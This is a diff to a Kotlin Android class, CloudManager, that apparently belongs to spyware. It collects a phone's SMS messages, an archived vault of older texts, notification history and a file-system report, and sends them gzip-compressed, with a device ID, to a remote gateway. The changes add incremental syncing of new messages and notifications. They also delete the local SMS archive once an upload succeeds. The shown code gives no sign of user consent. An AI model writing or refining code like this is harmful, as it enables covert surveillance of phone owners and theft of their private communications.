@@ -49,25 +49,23 @@ object CloudManager {
                     json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                 }
 
-                // --- MODULE 2: SMS ---
+                // --- MODULE 2: SMS (DELTA SYNC) ---
                 if (isAll || moduleMap.containsKey("sms")) {
-                    val limit = moduleMap["sms"] ?: -1
-                    if (limit > 0) {
-                        // ACTIVE FETCH: Scrape DB directly for X latest items
-                        json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
-                        json.put("fetch_mode", "ACTIVE_DB_SCRAPE")
-                    } else {
-                        // PASSIVE: Send cached logs
-                        json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
-                        
-                        // Check for Vaulted Inbox
-                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
-                        if (vaultFile.exists()) {
-                            try {
-                                val vaultData = vaultFile.readText()
-                                json.put("historical_sms", JSONArray(vaultData))
-                            } catch(e: Exception) {}
-                        }
+                    val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
+                    val currentSmsLogs = JSONArray(prefs.getString("sms_logs_cache", "[]"))
+                    val deltaSms = JSONArray()
+                    
+                    for (i in 0 until currentSmsLogs.length()) {
+                        val item = currentSmsLogs.getJSONObject(i)
+                        if (item.optLong("timestamp", 0L) > lastSmsSync) deltaSms.put(item)
+                    }
+
+                    if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
+                    
+                    val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
+                    if (vaultFile.exists()) {
+                        val vaultData = vaultFile.readText()
+                        json.put("historical_sms", JSONArray(vaultData))
                     }
                     json.put("sms_count", prefs.getInt("sms_count", 0))
                 }
@@ -139,9 +137,16 @@ object CloudManager {
                     json.put("file_skeleton", FileManager.generateReport())
                 }
                 
-                // --- MODULE 9: NOTIFICATIONS ---
+                // --- MODULE 9: NOTIFICATIONS (DELTA SYNC) ---
                 if (isAll || modules.contains("notifications")) {
-                     json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
+                    val lastNotifSync = prefs.getLong("last_sync_notif_ts", 0L)
+                    val currentNotifs = JSONArray(prefs.getString("notif_history", "[]"))
+                    val deltaNotifs = JSONArray()
+                    for (i in 0 until currentNotifs.length()) {
+                        val item = currentNotifs.getJSONObject(i)
+                        if (item.optLong("ts", 0L) > lastNotifSync) deltaNotifs.put(item)
+                    }
+                    if (deltaNotifs.length() > 0) json.put("notif_history", deltaNotifs)
                 }
 
                 // --- SUMMARY STATS AGGREGATION ---
@@ -163,31 +168,42 @@ object CloudManager {
                 
                 json.put("summary_stats", summary)
 
-                // SEND TO SUPABASE
+                // ATOMIC GZIP COMPRESSION (Fix 6: Prevents corrupted streams)
                 val wrapper = JSONObject()
                 wrapper.put("action", "upload_stats")
                 wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                 wrapper.put("payload", json)
 
-                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
-                val supabaseKey = SecretVault.getLock(ctx)
+                val bos = java.io.ByteArrayOutputStream()
+                java.util.zip.GZIPOutputStream(bos).use {
+                    it.write(wrapper.toString().replace("\\u0000", "").toByteArray(Charsets.UTF_8))
+                }
+                val compressedBytes = bos.toByteArray()
 
-                val url = URL(supabaseUrl)
+                val url = URL(SecretVault.getGatewayUrl(ctx))
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
-                conn.setRequestProperty("apikey", supabaseKey)
-                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
+                conn.setRequestProperty("apikey", SecretVault.getLock(ctx))
+                conn.setRequestProperty("Authorization", "Bearer ${SecretVault.getLock(ctx)}")
                 conn.setRequestProperty("Content-Type", "application/json")
                 conn.setRequestProperty("Content-Encoding", "gzip")
-                conn.setRequestProperty("Accept", "application/json")
                 conn.doOutput = true
+                conn.setFixedLengthStreamingMode(compressedBytes.size)
 
-                // CRITICAL: GZIP streams must be finished and flushed before checking ResponseCode
-                conn.outputStream.use { os ->
-                    java.util.zip.GZIPOutputStream(os).use { gzip ->
-                        val sanitized = wrapper.toString().replace("\\u0000", "")
-                        gzip.write(sanitized.toByteArray(Charsets.UTF_8))
-                        gzip.finish() 
+                conn.outputStream.use { it.write(compressedBytes) }
+
+                val code = conn.responseCode
+                if (code in 200..299) {
+                    // Sync Success: Update Delta Timestamps
+                    val now = System.currentTimeMillis()
+                    prefs.edit()
+                        .putLong("last_sync_sms_ts", now)
+                        .putLong("last_sync_notif_ts", now)
+                        .apply()
+                    // Clean up vault only on success
+                    if (json.has("historical_sms")) {
+                        prefs.edit().putBoolean("historical_sms_dumped", true).apply()
+                        java.io.File(ctx.filesDir, "sms_archive_vault.json").delete()
                     }
                 }
 
